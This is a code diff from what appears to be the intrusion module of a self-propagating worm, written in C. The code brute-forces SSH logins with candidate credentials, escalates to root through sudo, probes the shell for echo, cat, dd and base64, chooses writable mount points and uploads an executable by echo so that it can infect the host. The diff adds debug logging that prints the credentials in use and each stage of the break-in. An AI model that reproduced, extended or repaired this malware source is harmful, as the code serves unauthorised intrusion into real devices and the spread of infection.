@@ -409,6 +409,13 @@ static bool bne_sh_send (
 	const size_t len = strlen(cmdline);
 	ssize_t f_ret;
 
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 3) {
+		prne_dbgpf(
+			"bne@%"PRIxPTR"\t: bne_sh_send():\n%s\n",
+			(uintptr_t)s_ctx->ctx,
+			cmdline);
+	}
+
 	prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
 	f_ret = s_ctx->write_f(s_ctx->ctx, cmdline, len, s_ctx->ev);
 	if (f_ret <= 0 || (size_t)f_ret != len) {
@@ -876,8 +883,20 @@ static bool bne_sh_setup (
 	}
 	if (uid != 0) {
 		// Not root. Try escalating the shell
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				"bne@%"PRIxPTR"\t: broke in as uid %d. Trying sudo...\n",
+				(uintptr_t)ctx,
+				uid);
+		}
+
 		if (!bne_sh_sudo(ctx, s_ctx)) {
 			// sudo failed. no point infecting unprivileged machine
+			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+				prne_dbgpf(
+					"bne@%"PRIxPTR"\t: sudo failed\n",
+					(uintptr_t)ctx);
+			}
 			goto END;
 		}
 	}
@@ -909,9 +928,32 @@ static bool bne_sh_setup (
 			goto END;
 		}
 	}
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
+		prne_dbgpf(
+			"bne@%"PRIxPTR"\t: available commands - ",
+			(uintptr_t)ctx);
+		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) {
+			prne_dbgpf("echo ");
+		}
+		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT) {
+			prne_dbgpf("cat ");
+		}
+		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_DD) {
+			prne_dbgpf("dd ");
+		}
+		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_BASE64) {
+			prne_dbgpf("base64 ");
+		}
+		prne_dbgpf("\n");
+	}
 	if (!((s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) &&
 		(s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT)))
 	{
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+			prne_dbgpf(
+				"bne@%"PRIxPTR"\t: echo and cat unavailable on this system\n",
+				(uintptr_t)ctx);
+		}
 		ctx->result.err = ENOSYS;
 		goto END;
 	}
@@ -972,7 +1014,16 @@ static bool bne_sh_setup (
 	}
 	prne_llist_clear(&s_ctx->up_loc);
 	qsort(mp_arr, mp_cnt, sizeof(bne_mp_t), bne_mp_cmp_f);
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
+		prne_dbgpf(
+			"bne@%"PRIxPTR"\t: suitable mount points:\n",
+			(uintptr_t)ctx);
+	}
 	for (size_t i = 0, j = mp_cnt - 1; i < mp_cnt; i += 1, j -= 1) {
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
+			prne_dbgpf("%s\n", mp_arr[j].path);
+		}
+
 		if (prne_llist_append(
 			&s_ctx->up_loc,
 			(prne_llist_element_t)mp_arr[j].path) != NULL)
@@ -1065,6 +1116,14 @@ static bool bne_sh_setup (
 		}
 	}
 
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		const char *arch_str = prne_arch_tostr(ctx->result.arch);
+
+		prne_dbgpf(
+			"bne@%"PRIxPTR"\t: arch: %s\n",
+			(uintptr_t)ctx,
+			arch_str == NULL ? "?" : arch_str);
+	}
 	ret = ctx->result.arch != PRNE_ARCH_NONE;
 
 END: // CATCH
@@ -1100,6 +1159,12 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 			ctx->result.arch = PRNE_ARCH_I686;
 			break;
 		default: return false;
+		}
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				"bne@%"PRIxPTR"\t: retrying bin_rcb with compat arch %s\n",
+				(uintptr_t)ctx,
+				prne_arch_tostr(ctx->result.arch));
 		}
 		ctx->result.prc = prne_start_bin_rcb(
 			&sh_ctx->rcb,
@@ -1191,6 +1256,13 @@ static bool bne_sh_prep_upload (
 			"echo $?"
 		};
 
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				"bne@%"PRIxPTR"\t: prep upload on %s\n",
+				(uintptr_t)ctx,
+				s_ctx->upload_dir);
+		}
+
 		cmd = prne_build_str(
 			sb_cmd,
 			sizeof(sb_cmd)/sizeof(const char **));
@@ -1230,6 +1302,12 @@ static bool bne_sh_upload_echo (
 	if (exec_len > 255) {
 		ctx->result.err = E2BIG;
 		return false;
+	}
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			"bne@%"PRIxPTR"\t: uploading using echo ...\n",
+			(uintptr_t)ctx);
 	}
 
 	_Static_assert(sizeof(s_ctx->buf) >= 2048, "FIXME");
@@ -1274,6 +1352,12 @@ static bool bne_sh_upload_echo (
 			// Assume that something went wrong if there's any output at all
 			poll_ret = s_ctx->pollin_f(s_ctx->ctx);
 			if (poll_ret != 0) {
+				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+					prne_dbgpf(
+						"bne@%"PRIxPTR"\t: "
+						"output produced while echo uploading!\n",
+						(uintptr_t)ctx);
+				}
 				ret = false;
 				break;
 			}
@@ -1468,7 +1552,7 @@ static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 		default: continue;
 		}
 
-		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 			prne_dbgpf(
 				"bne@%"PRIxPTR"\t: knocking %"PRIu16"\n",
 				(uintptr_t)ctx,
@@ -1590,7 +1674,7 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 		if (f_ret == 0) {
 			// need auth
 			// check vs->auth_list maybe?
-			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 				prne_dbgpf(
 					"bne@%"PRIxPTR"\t: trying cred %s %s\n",
 					(uintptr_t)ctx,
@@ -1622,6 +1706,14 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 			}
 		}
 
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				"bne@%"PRIxPTR"\t: authenticated using cred %s %s\n",
+				(uintptr_t)ctx,
+				ctx->result.cred.id,
+				ctx->result.cred.pw);
+		}
+
 		// after auth, acquire shell
 		do { // FAKE LOOP
 			vs->ch_shell = prne_lssh2_open_ch(
@@ -1643,7 +1735,21 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 				break;
 			}
 #endif
-			if (prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev)) {
+			f_ret = prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev);
+			if (f_ret == 0) {
+				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+					prne_dbgpf(
+						"bne@%"PRIxPTR"\t: shell opened\n",
+						(uintptr_t)ctx);
+				}
+			}
+			else {
+				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+					prne_dbgpf(
+						"bne@%"PRIxPTR"\t: failed to open shell (%d)\n",
+						(uintptr_t)ctx,
+						f_ret);
+				}
 				break;
 			}
 
